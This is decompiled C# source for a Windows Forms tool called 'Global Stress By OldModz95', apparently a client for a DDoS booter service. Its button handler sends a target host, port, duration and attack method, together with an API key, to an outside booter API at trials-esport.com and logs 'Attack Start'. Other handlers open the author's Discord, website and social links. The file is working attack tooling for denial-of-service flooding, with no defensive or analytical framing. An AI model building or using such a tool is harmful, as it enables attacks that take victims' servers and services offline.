using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using Bunifu.Framework.UI;
using Global_Stress.Properties;
using theme;

namespace Global_Stress
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Form1()
		{
			this.InitializeComponent();
			this.logs.AppendText("\r\nApplication lancer avec succes et sans erreur.");
			this.logs.AppendText("\r\nBienvenue sur Global Stress By OldModz95");
			this.logs.AppendText("\r\n========================================");
			this.logs.AppendText("\r\nApplication launch successfully and without error.");
			this.logs.AppendText("\r\nWelcome to the Global Stress By OldModz95");
			this.logs.AppendText("\r\n========================================");
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020E8 File Offset: 0x000002E8
		private void localisation_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString(string.Concat(new string[]
			{
				"https://trials-esport.com/api",
				this.api.Text,
				".php?key=",
				this.key.Text,
				"&host=",
				this.host.Text,
				"&port=",
				this.port.Text,
				"&time=",
				this.time.Text,
				"&method=",
				this.method.Text
			}));
			this.Historique.Text = text;
			this.logs.Clear();
			this.logs.AppendText("\r\n==============Attack Start==============");
			this.logs.AppendText("\r\nAPI: " + this.api.Text);
			this.logs.AppendText("\r\nKey: " + this.key.Text);
			this.logs.AppendText("\r\nHost: " + this.host.Text);
			this.logs.AppendText("\r\nPort: " + this.port.Text);
			this.logs.AppendText("\r\nTime: " + this.time.Text);
			this.logs.AppendText("\r\nMethod: " + this.method.Text);
			this.logs.AppendText("\r\n========================================");
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000229C File Offset: 0x0000049C
		private void oldmodz95_Click(object sender, EventArgs e)
		{
			if (this.contact.SelectedIndex == 0)
			{
				Process.Start("https://discord.gg/3t2568W");
			}
			if (this.contact.SelectedIndex == 1)
			{
				Process.Start("http://oldmodz95.fr");
			}
			if (this.contact.SelectedIndex == 2)
			{
				Process.Start("https://status.oldmodz95.eu");
			}
			if (this.contact.SelectedIndex == 3)
			{
				Process.Start("https://youtube.com/oldmodz95");
			}
			if (this.contact.SelectedIndex == 4)
			{
				Process.Start("https://twitter.com/oldytb");
			}
			if (this.contact.SelectedIndex == 5)
			{
				Process.Start("https://fr.trustpilot.com/review/oldmodz95.fr");
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002376 File Offset: 0x00000576
		private void jojo_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Jojo_Dos#8122");
		}

		// Token: 0x04000001 RID: 1
		private WebClient GlobalStress = new WebClient();
	}
}
